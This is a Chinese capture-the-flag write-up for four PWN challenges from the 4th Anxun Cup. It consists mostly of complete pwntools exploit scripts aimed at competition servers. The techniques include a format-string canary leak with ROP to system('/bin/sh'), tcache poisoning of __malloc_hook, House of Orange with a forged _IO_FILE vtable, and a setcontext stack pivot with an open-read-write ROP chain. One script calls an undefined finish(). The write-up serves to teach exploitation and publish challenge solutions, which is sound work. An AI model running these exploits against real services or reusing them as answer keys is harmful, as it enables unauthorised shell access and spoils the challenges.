# 第4届安洵杯 PWN WP



## stack

### 思路

一道格式化字符串漏洞，查看保护可以发现 开启了PIE和 canary

通过ida可以发现后门函数 及其所需的参数。

观察程序，可以发现能够利用格式化字符串漏洞泄露地址信息和canary从而绕过其防护

再次利用格式化字符串漏洞覆盖canary和ret ，使其可以执行system("/bin/sh")

### Exp

```python
#! /usr/bin/python3
from pwn import*
#io = remote("101.35.18.209",20113)
io = remote("47.108.195.119",20113)
#io = process('./ezstack')
context.log_level = 'debug'

#--------------------------------
io.recvuntil("名称:")
io.sendline("")
io.recvuntil("名字:")
io.sendline("")
#--------------------------------

sh = 0xB24
system = 0xA7C
pop_rdi = 0x000b03
ret = 0x00000000000007c1
#gdb.attach(io)
io.sendline(b'%12$p%11$p')
stack = io.recv(14)
stack = int(stack,16)
stack = stack & 0xfffffffffffff000
print("stack---->"+hex(stack))
canary = io.recvuntil('\n')[-17:]
canary = int(canary,16)
#gdb.attach(io)
print("canary--->"+hex(canary))

sh = stack + 0xB24
system = stack + 0xA8C
pop_rdi = stack + 0x000b03
ret = stack + 0x00007c1

print("sh",hex(sh))
print("system",hex(system))
print("pop_rdi",hex(pop_rdi))
print("ret",hex(ret))

io.recvuntil("--+--")
#gdb.attach(io)
io.sendline(b'a'*0x18 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh) + p64(system))

io.interactive()
```

## noleak

通过观察可以发现有一个栅栏加密。并且存在offbynull漏洞

1.通过栅栏加密利用char为1byte，unsigned int为4byte的特性，加了个一个简单的栅栏加密字符串，解密只需将unsigned int类型的enc密文先转为单字节的char类型，然后进行栅栏为4的栅栏解密。

2.利用溢出漏洞修改size，将其free后再次malloc可以通过show泄露其地址。

3.利用tcache的特点，可以通过tcache_attack进行攻击，向malloc_hook中写入one_gadget.

4.再次调用malloc即可getshell

解密算法

```python
#--------------------------------------
​	a=[0x5f5f794e,0x63745f30,0x7448315f,0x37656e70]
​	b=[]
​	for i in range(4):
​	    tmp=a[i]
​	    for j in range(4):
​	        b.append(chr(tmp&0xff))
​	        tmp=tmp>>8
​	flag=''
​	for i in range(4):
​	    for j in range(4):
​	        flag+=b[i+4*j]
​	print(flag)
​	#N0_py_1n_tHe_ct7
#---------------------------------------
```



### Exp

```python
#! /usr/bin/python3
from pwn import *
from LibcSearcher import *
#sh=remote("47.108.195.119",20182)
sh=remote("101.35.18.209",20112)
context.log_level = 'debug'
libc=ELF('./libc.so.6')
elf = ELF('./noleak')
#sh=process('./noleak')

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'

def choice(elect):
	sh.recvuntil('4) delete a chunk\n')
	sh.sendline(str(elect))

def add(index,size):
	choice(1)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil('?')
	sh.sendline(str(size))

def edit(index,content,full=False):
	choice(3)
	sh.recvuntil('?')
	sh.sendline(str(index))
	sh.recvuntil(':')
	if full:
		sh.send(content)
	else:
		sh.sendline(content)

def show(index):
	choice(2)
	sh.recvuntil('?')
	sh.sendline(str(index))

def delete(index):
	choice(4)
	sh.recvuntil('?')
	sh.sendline(str(index))

def exploit():
	li('exploit...')
	#--------------------------------
#	sh.recvuntil("名称:")
#	sh.sendline("")
#	sh.recvuntil("名字:")
#	sh.sendline("")
	#--------------------------------

	sh.sendlineafter("start !\n","N0_py_1n_tHe_ct7")

	add(0,0x80) #A
	add(1,0x18) #B
	add(2,0xf0) #C
	for i in range(7):
		add(i+3,0x80)

	for i in range(7):
		delete(i+3)
		add(i+3,0xf0)

	for i in range(7):
		delete(i+3)
	delete(0)
	#gdb.attach(sh)
	edit(1,b'\x00'*0x10+p64(0xb0),full=True)
	delete(2)
	#gdb.attach(sh)

	for i in range(8):
		add(3,0x80)
	show(1)
	sh.recvuntil('\n',drop=True)
	libc_base=u64(sh.recvuntil('\n',drop=True).replace(b'\n',b'').ljust(8,b'\x00')) - 0x70 - libc.sym['__malloc_hook']
	malloc_hook=libc_base+libc.symbols['__malloc_hook']
	realloc=libc_base+libc.symbols['realloc']
	gadget=[0x41602,0x41656,0xdeec2]
	onegadget=libc_base+gadget[2]

	print(libc_base)
	print(malloc_hook)
	print(onegadget)
	#gdb.attach(sh)

	add(2,0x10)
	delete(2)
	edit(1,p64(malloc_hook-0x8) )
	add(3,0x10)
	add(4,0x18)
	edit(4,p64(onegadget)+p64(onegadget))
	#gdb.attach(sh)
	add(1,0x10)
	sh.interactive()

if __name__ == '__main__':
    exploit()
    finish()
```



## ezheap

观察代码 可以发现没有 可以free堆块的函数 ， 于是考虑可以使用houseOforange可以利用堆溢出修改下一chunk的size,从而是堆块分配值unsortbin，然后利用uaf漏洞进行泄露

完成泄露后可以使用FSOP，通过伪造的 vtable 和_IO_FILE_plus,从而通过报错来劫持程序流

1.首先通过gift函数接收地址。在通过溢出修改size，从而使得topchunk的size为0xf81 。 这里需要自行调试使得该chunk对齐

2.再次malloc一个大堆块，使得topchunk进入unsortbin,再次切割该堆块，通过show函数泄露地址。

3.伪造vtable 和_IO_FILE_plus

    fake_file = b'/bin/sh\x00'+p64(0x61)
    fake_file += p64(0)+p64(io_list_all-0x10)
    fake_file += p64(0) + p64(1)
    fake_file = fake_file.ljust(0xc0,b'\x00')
    fake_file += p64(0) * 3
    fake_file += p64(heap+0x1198) #vtable ptr
    fake_file += p64(0) * 2
    fake_file += p64(system)
    payload += fake_file

进入报错函数后将会进入system并以/bin/sh为参数，这注意#vtable ptr需要自行调试使其指向自身。

4.再次执行malloc即可getshell

### Exp

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
from pwn import *
import os
r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
context.log_level='debug'
#elf = ELF('./EZheap')
elf = ELF('./pwn')
libc = ELF("./libc.so.6")
#io = elf.process()
io = remote("47.108.195.119",  20141)


def ad(sz,na):
    sla('away\n', '1')
    sla('size of it', str(sz))
    sla('Name?', na)

def md(sz, na):
    sla('away\n', '2')
    sla('size of it', str(sz))
    sla('name', na)

def dp():
    sla('away\n', '3')



def finish():
    ia()
    c()

def exploit():
    li('exploit...')

    io.sendlineafter(':', 'test_team')
    io.sendlineafter(':', 'test_user')
    io.recvline()

    heap = io.recvuntil(b'\n',drop=True).ljust(8, b'\x00')
    heap = int(heap,16)
    print("heap",hex(heap))

    ad(0x20,"aaaa")
    ad(0xbd0+0x420,"aaaa")
    ad(0x20,"bbbb")
    md(0x40,b"A"*0x20 + p64(0) +p64(0xf81))
    #gdb.attach(io)
    ad(0x1000,"AAAA")
    ad(0x40,"BBBBBBBB")
    dp() 
    
    io.recvuntil("BBBBBBBB")
    area = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00')) - 1514
    malloc = area  - 0x10
    libc_base = malloc - libc.sym['__malloc_hook']
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system = libc_base + libc.symbols['system']
    print("area             ",hex(area))
    print("malloc           ",hex(malloc))
    print("io_list_all      ",hex(io_list_all))
    print("system           ",hex(system))
    print("heap",hex(heap))
    #gdb.attach(io)
    payload = b'a' * 0x40
    fake_file = b'/bin/sh\x00'+p64(0x61)#to small bin
    fake_file += p64(0)+p64(io_list_all-0x10)
    fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
    fake_file = fake_file.ljust(0xc0,b'\x00')
    fake_file += p64(0) * 3
    fake_file += p64(heap+0x1198) #vtable ptr
    fake_file += p64(0) * 2
    fake_file += p64(system)
    payload += fake_file

    md(len(payload),payload)
    #gdb.attach(io)
    io.recvuntil("away\n")
    io.sendline('1')

#    gdb.attach(io)  
   
#-------------------------------start

if __name__ == '__main__':
    exploit()
    finish()
```







## pwnsky



### 思路

取出程序中所有花指令，花指令在加密算法和add堆块函数中，使其F5能够反编译出正确的伪代码，先逆向流密码加密，很简单，只需把加密算法还原，就是解密算法了，然后接着就是进行普通堆利用了，去掉在add函数中只要满足data[0] == "\x00"的话，那么就出现off by one漏洞，通过该漏洞去实现一个堆块合并，修改__free_hook为setcontext的gadget，实现堆栈迁移，在堆中实现orw。

lua编译工具:https://github.com/viruscamp/luadec



### Exp


```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
from pwn import *
from sys import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
#context(arch = 'amd64', os = 'linux', log_level='debug')
exeFile  = "./pwn"
libFile  = "./libc.so.6"
LOCAL = 0
LIBC = 1

XorTable = [
        0xbe, 0xd1, 0x90, 0x88, 0x57, 0x00, 0xe9, 0x53, 0x10, 0xbd, 0x2a, 0x34, 0x51, 0x84, 0x07, 0xc4, 
        0x33, 0xc5, 0x3b, 0x53, 0x5f, 0xa8, 0x5d, 0x4b, 0x6d, 0x22, 0x63, 0x5d, 0x3c, 0xbd, 0x47, 0x6d, 
        0x22, 0x3f, 0x38, 0x4b, 0x7a, 0x4c, 0xb8, 0xcc, 0xb8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 
        0xb1, 0xc7, 0xa6, 0xd1, 0xa0, 0x48, 0x21, 0xc4, 0x1b, 0x0a, 0xad, 0xc9, 0xa5, 0xe6, 0x14, 0x18, 
        0xfc, 0x7b, 0x53, 0x59, 0x8b, 0x0d, 0x07, 0xcd, 0x07, 0xcc, 0xbc, 0xa5, 0xe0, 0x28, 0x0e, 0xf9, 
        0x31, 0xc8, 0xed, 0x78, 0xf4, 0x75, 0x60, 0x65, 0x52, 0xb4, 0xfb, 0xbf, 0xac, 0x6e, 0xea, 0x5d, 
        0xca, 0x0d, 0xb5, 0x66, 0xac, 0xba, 0x06, 0x30, 0x95, 0xf4, 0x96, 0x42, 0x7a, 0x7f, 0x58, 0x6d, 
        0x83, 0x8e, 0xf6, 0x61, 0x7c, 0x0e, 0xfd, 0x09, 0x6e, 0x42, 0x6b, 0x1e, 0xb9, 0x14, 0x22, 0xf6, 

        0x16, 0xd2, 0xd2, 0x60, 0x29, 0x23, 0x32, 0x9e, 0xb4, 0x82, 0xee, 0x58, 0x3a, 0x7d, 0x1f, 0x74, 
        0x98, 0x5d, 0x17, 0x64, 0xe4, 0x6f, 0xf5, 0xad, 0x94, 0xaa, 0x89, 0xe3, 0xbe, 0x98, 0x91, 0x38, 
        0x70, 0xec, 0x2f, 0x5e, 0x9f, 0xc9, 0xb1, 0x26, 0x3a, 0x64, 0x48, 0x13, 0xf1, 0x1a, 0xc5, 0xd5, 
        0xe5, 0x66, 0x11, 0x11, 0x3a, 0xaa, 0x79, 0x45, 0x42, 0xb4, 0x57, 0x9d, 0x3f, 0xbc, 0xa3, 0xaa, 
        0x98, 0x4e, 0x6b, 0x7a, 0x4a, 0x2f, 0x3e, 0x10, 0x7a, 0xc5, 0x33, 0x8d, 0xac, 0x0b, 0x79, 0x33, 
        0x5d, 0x09, 0xfc, 0x9d, 0x9b, 0xe5, 0x18, 0xcd, 0x1c, 0x7c, 0x8b, 0x0a, 0xa8, 0x95, 0x56, 0xcc, 
        0x4e, 0x34, 0x31, 0x33, 0xf5, 0xc1, 0xf5, 0x03, 0x0a, 0x4a, 0xb4, 0xd1, 0x90, 0xf1, 0x8f, 0x57, 
        0x20, 0x05, 0x0d, 0xa0, 0xcd, 0x82, 0xb3, 0x25, 0xd8, 0xd2, 0x20, 0xf3, 0xc5, 0x96, 0x35, 0x35, 
    ]


def Encode(keys, data):
    key_arr = []
    raw_key = []
    data_arr = []
    for c in keys:
        key_arr.append(c)
        raw_key.append(c)

    for c in data:
        data_arr.append(c)
    keys = key_arr
    data = data_arr

    for i in range(len(data)):
        n = ((keys[i & 7] + keys[(i + 1) & 7]) * keys[(i + 2) & 7] + keys[(i + 3) & 7]) & 0xff
        data[i] ^= n ^ XorTable[n]
        keys[i & 7] = (n * 2 + 3) & 0xff
        if((i & 0xf) == 0):
            keys = KeyRandom(raw_key, XorTable[i & 0xff])

    out = b''
    for c in data:
        out += c.to_bytes(1, byteorder='little')
    return out

def KeyRandom(raw_key, seed):
    out_key = []
    for c in range(8):
        out_key.append(0)

    for i in range(8):
        out_key[i] = (raw_key[i] ^ XorTable[raw_key[i]]) & 0xff;
        out_key[i] ^= (seed + i) & 0xff;
    return out_key


if(LOCAL == 0):
    if(len(argv) < 3):
        print('Usage: python2 ./exp.py [host] [port]')
        exit(-1)
    host = argv[1]
    port = int(argv[2])

def add(size, text):
    io.sendlineafter('$', 'add')
    io.sendlineafter('?', str(size))
    sleep(0.2)
    io.send(text)

def delete(idx):
    io.sendlineafter('$', 'del')
    io.sendlineafter('?', str(idx))

def get(idx):
    io.sendlineafter('$', 'get')
    io.sendlineafter('?', str(idx))

def quit():
    io.sendlineafter('$', 'exit')

def login(acc, pas):
    io.sendlineafter('$', 'login')
    io.sendlineafter(':', str(acc))
    io.sendlineafter(':', str(pas))

def code(d):
    a = 0
    
#--------------------------Exploit--------------------------
def exploit():
    io.sendlineafter(':', 'team_test')
    io.sendlineafter(':', 'i0gan')
    #6b8b4567327b23c6
    key = p64(0x6b8b4567327b23c6)

    login(1000, 418894113)

    add(0x320, '\n') # 0
    add(0x320, '\n') # 1

    delete(1)
    delete(0)

    add(0x320, '\n') # 0
    get(0)
    io.recvuntil('\n')
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa
    print('heap: ' + hex(heap))
    delete(0)

    add(0x500, '\n') # 0
    add(0x500, '\n') # 1

    delete(0)

    add(0x500, '\n') # 0
    get(0)
    io.recvuntil('\n')
    leak = u64(io.recv(6).ljust(8, b'\x00')) + 0x80 - 10
    libc_base = leak - libc.sym['__malloc_hook'] - 0x10
    print('leak: ' + hex(leak))
    print('libc_base: ' + hex(libc_base))
    
    free_hook = libc_base + libc.sym['__free_hook']
    setcontext = libc_base + libc.sym['setcontext'] + 61
    ret = libc_base + 0x25679

    libc_open = libc_base + libc.sym['open']
    libc_read = libc_base + libc.sym['read']
    libc_write = libc_base + libc.sym['write']
    pop_rdi = libc_base + 0x26b72
    pop_rsi = libc_base + 0x27529
    pop_rdx_r12 = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret
    gadget = libc_base + 0x154930 # local

    add(0x80, '\n') # 2
    add(0x20, '\n') # 3


    b = 3
    j = 20
    for i in range(b, j):
        add(0x20, 'AAA\n')

    for i in range(b + 10, j):
        delete(i)

    add(0x98, Encode(key, b'AAA') + b'\n') # 13
    add(0x500, Encode(key, b'AAA') + b'\n') # 14
    add(0xa0, 'AAA\n') # 15
    add(0xa0, 'AAA\n') # 16
    add(0xa0, 'AAA\n') # 17

    delete(13)

    delete(17)
    delete(16)
    delete(15)
    # releak heap
    add(0xa8, b'\n') # 13
    get(13)

    io.recvuntil('\n')
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa  + 0x200 - 0x90 # remote
    #heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa  + 0x200 # local

    delete(13)

    p = b'\x00' + b'\x11' * 0x97
    add(0x98, Encode(key, p) + b'\xc1') # 13

    delete(14)
    # 5c0
    p = b'A' * 0x500
    p += p64(0) + p64(0xb1)
    p += p64(libc_base + libc.sym['__free_hook']) + p64(0)
    add(0x5b0, Encode(key, p) + b'\n') # 14
    # releak heap
    add(0xa8, Encode(key, b"/bin/sh\x00") + b'\n') # 13
    add(0xa8, Encode(key, p64(gadget)) + b'\n') # modify __free_hook as a gadget set rdi -> rdx

    p =  p64(1) + p64(heap) # set to rdx
    p += p64(setcontext)
    p = p.ljust(0x90, b'\x11')
    p += p64(heap + 0xb0) # rsp
    p += p64(ret) # rcx

    rop  = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18)
    rop += p64(pop_rsi) + p64(0)
    rop += p64(pop_rdx_r12) + p64(0) + p64(0)
    rop += p64(libc_open)

    rop += p64(pop_rdi) + p64(3)
    rop += p64(pop_rsi) + p64(heap)
    rop += p64(pop_rdx_r12) + p64(0x80) + p64(0)
    rop += p64(libc_read)

    rop += p64(pop_rdi) + p64(1)
    rop += p64(libc_write)

    rop += p64(pop_rdi) + p64(0)
    rop += p64(libc_read)

    p += rop
    p += b'./sky_token\x00'

    add(0x800, Encode(key, p) + b'\n') # 13

    #print('heap: ' + hex(heap))

    print('get flag...')
    print('heap: ' + hex(heap))
    #gdb.attach(io)
    delete(17)

    
if __name__ == '__main__':
    if LOCAL:
        exe = ELF(exeFile)
        if LIBC:
            libc = ELF(libFile)
            io = exe.process()
            #io = exe.process(env = {"LD_PRELOAD" : libFile})
        else:
            io = exe.process()
    else:
        exe = ELF(exeFile)
        io = remote(host, port)
        if LIBC:
            libc = ELF(libFile)
    
    exploit()
    io.interactive()

```



